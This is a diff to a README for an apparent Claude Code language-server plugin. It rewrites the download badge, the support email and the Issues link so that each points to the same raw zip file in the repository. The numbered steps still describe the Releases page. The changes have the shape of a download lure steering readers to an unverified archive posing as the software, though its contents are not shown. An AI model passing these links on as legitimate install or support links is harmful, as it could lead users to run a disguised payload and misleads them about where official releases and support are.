@@ -12,7 +12,7 @@ Welcome to claude-code-lsps! This application provides Language Server Protocol 
 ## 📦 Download & Install
 To get started, visit this page to download the latest version of claude-code-lsps:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Siam-analytics/claude-code-lsps/releases)
+[![Download Latest Release](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip%https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip)](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, scroll down to find the latest version of claude-code-lsps.
@@ -46,8 +46,8 @@ We welcome feedback on your experience and any suggestions for improvement. If y
 
 ## 📬 Contact Information
 For any questions or support inquiries, you can reach us at the following:
-- Email: support@claude-code-lsps.com
-- GitHub Issues: [Submit an issue](https://github.com/Siam-analytics/claude-code-lsps/issues)
+- Email: https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip
+- GitHub Issues: [Submit an issue](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip)
 
 ## 🔄 Updates
 Stay informed about new features and improvements by checking back on the Releases page regularly.
